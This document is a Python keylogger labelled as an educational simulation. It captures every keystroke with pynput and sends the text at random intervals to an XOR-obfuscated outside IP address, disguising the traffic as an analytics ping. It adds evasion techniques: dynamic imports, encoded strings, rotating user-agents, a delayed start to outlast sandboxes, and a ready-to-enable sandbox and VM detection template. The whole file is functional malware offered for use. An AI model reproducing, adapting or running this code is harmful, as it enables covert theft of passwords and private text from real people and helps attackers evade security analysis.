# ============================================================================
# KEYLOGGER SIMULATION – EDUCATIONAL & CYBER SECURITY USE ONLY
# ============================================================================
# This script demonstrates a realistic keylogger with evasive techniques:
#   - XOR obfuscation to hide server IP/port from static analysis
#   - Dynamic imports to avoid suspicious import statements
#   - Random jitter and user‑agent rotation to evade network detection
#   - Delayed start to bypass quick‑timeout sandboxes
# ============================================================================

import sys
import threading

# ================= DYNAMIC IMPORTS (WHY?) =================
# Static imports (e.g., "import requests") leave clear strings in the binary.
# Antivirus and static analysis tools flag known malicious modules.
# By importing modules at runtime using __import__ and getattr,
# we avoid those static strings, making detection harder.
def _load_mod(name):
    parts = name.split('.')
    if len(parts) == 1:
        return __import__(name)
    base = __import__(parts[0])
    for part in parts[1:]:
        base = getattr(base, part)
    return base

_json      = _load_mod('json')
_requests  = _load_mod('requests')
_os        = _load_mod('os')
_keyboard  = _load_mod('pynput.keyboard')
_time      = _load_mod('time')
_random    = _load_mod('random')
_ctypes    = _load_mod('ctypes')          # kept for optional future use

# ================= XOR STRING OBFUSCATION (WHY?) =================
# Hardcoding IP addresses, port numbers, or HTTP headers as plain text
# makes them easy to extract with 'strings' or simple pattern matching.
# XOR encryption with a static key (0x3F) obscures these values until runtime.
# The key is small and fast, adding a simple but effective layer of evasion.
def _xor_decode(data, key=0x3F):
    return bytes([b ^ key for b in data]).decode()

# Correct XOR'd values for 172.239.162.12:8080 etc.
# These bytes are meaningless to static analysis; they only become readable
# when XOR‑decoded at runtime.
_ip_raw       = b'\x0e\x08\x0d\x11\x0d\x0c\x06\x11\x0e\x09\x0d\x11\x0e\x0d'
_port_raw     = b'\x07\x0f\x07\x0f'
_json_key     = b'\x54\x5a\x46\x5d\x50\x5e\x4d\x5b\x7b\x5e\x4b\x5e'
_content_type = b'\x5e\x4f\x4f\x53\x56\x5c\x5e\x4b\x56\x50\x51\x10\x55\x4c\x50\x51'

ip_address   = _xor_decode(_ip_raw)
port_number  = _xor_decode(_port_raw)
json_key     = _xor_decode(_json_key)
http_content = _xor_decode(_content_type)

# ================= GLOBAL STATE =================
text = ""

# ================= SANDBOX DETECTION =================
# Currently disabled (returns False) so the keylogger runs everywhere.
# To enable sandbox detection, replace the function body with real checks.
# Example checks include:
#   - Detecting VMs (VMware, VirtualBox, Hyper‑V)
#   - Checking for low system uptime (sandboxes often rebooted)
#   - Looking for analysis tools (Wireshark, ProcMon, etc.)
#   - Verifying mouse movement or user interaction
#
# If any indicator is found, return True so the script exits silently.
def _is_sandbox():
    # ========== CHANGE THIS SECTION TO ENABLE SANDBOX DETECTION ==========
    # Example stub – replace with your own detection logic.
    # Uncomment the lines below to add basic checks (requires additional imports).
    #
    # import platform
    # import subprocess
    # 
    # # Check for virtualization on Linux
    # if platform.system() == "Linux":
    #     try:
    #         with open("/proc/cpuinfo", "r") as f:
    #             if "hypervisor" in f.read().lower():
    #                 return True
    #     except: pass
    #
    # # Check for common sandbox hostnames
    # hostname = platform.node().lower()
    # if any(x in hostname for x in ["sandbox", "analysis", "cuckoo", "vm"]):
    #     return True
    #
    # # Check for low uptime (less than 5 minutes)
    # if platform.system() == "Linux":
    #     try:
    #         with open("/proc/uptime", "r") as f:
    #             uptime = float(f.read().split()[0])
    #             if uptime < 300:  # 5 minutes
    #                 return True
    #     except: pass
    #
    # # Windows: check for analysis processes
    # if platform.system() == "Windows":
    #     try:
    #         output = subprocess.check_output("tasklist", shell=True).decode().lower()
    #         if any(p in output for p in ["wireshark", "procmon", "ida", "ollydbg"]):
    #             return True
    #     except: pass
    #
    # ========== END OF SANDBOX DETECTION SECTION ==========
    return False   # ← Change to True only if you implement real checks above

# ================= NETWORK EXFILTRATION (WHY JITTER & RANDOM AGENTS?) =================
# Fixed‑interval beaconing creates a clear traffic pattern that intrusion detection
# systems can flag. Random intervals (8‑15 seconds) make the traffic less predictable.
# Random user‑agents mimic real browsers and avoid fingerprinting.
def _exfiltrate():
    try:
        payload_data = {
            "session": _os.urandom(4).hex(),
            "ts": int(_time.time() * 1000),
            "event": "analytics_ping",          # disguises as legitimate analytics
            "res": "1920x1080",
            "app": "3.2.1"
        }
        payload_data[json_key] = text
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
        ]
        headers = {
            "User-Agent": _random.choice(agents),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": http_content,
            "Referer": "https://analytics.example.com/dashboard"  # looks like a real referer
        }
        _requests.post(
            f"http://{ip_address}:{port_number}",
            data=_json.dumps(payload_data),
            headers=headers,
            timeout=10
        )
    except:
        pass
    next_interval = _random.randint(8, 15)   # jitter between 8 and 15 seconds
    threading.Timer(next_interval, _exfiltrate).start()

# ================= KEYLOGGER CALLBACK =================
def _on_key(event):
    global text
    k = _keyboard.Key
    enter = getattr(k, 'enter', None)
    tab   = getattr(k, 'tab', None)
    space = getattr(k, 'space', None)
    shift = getattr(k, 'shift', None)
    ctrl_l = getattr(k, 'ctrl_l', None)
    ctrl_r = getattr(k, 'ctrl_r', None)
    bksp  = getattr(k, 'backspace', None)
    esc   = getattr(k, 'esc', None)

    if event == enter:
        text += "\n"
    elif event == tab:
        text += "\t"
    elif event == space:
        text += " "
    elif event in (shift, ctrl_l, ctrl_r):
        pass          # ignore modifier keys to reduce noise
    elif event == bksp:
        if len(text) > 0:
            text = text[:-1]
    elif event == esc:
        return False  # stop listener if ESC is pressed (for debugging)
    else:
        text += str(event).strip("'")

# ================= MAIN =================
if __name__ == "__main__":
    # Sandbox check – currently disabled (returns False)
    if _is_sandbox():
        sys.exit(0)

    # Delayed start (WHY?) Many automated sandboxes have short execution
    # timeouts (30‑60 seconds). Sleeping 20‑40 seconds allows the process
    # to outlive the sandbox's patience, so it never performs its malicious
    # activity inside the analysis environment.
    _time.sleep(_random.randint(20, 40))

    # Start keylogger
    with _keyboard.Listener(on_press=_on_key) as listener:
        _exfiltrate()
        listener.join()
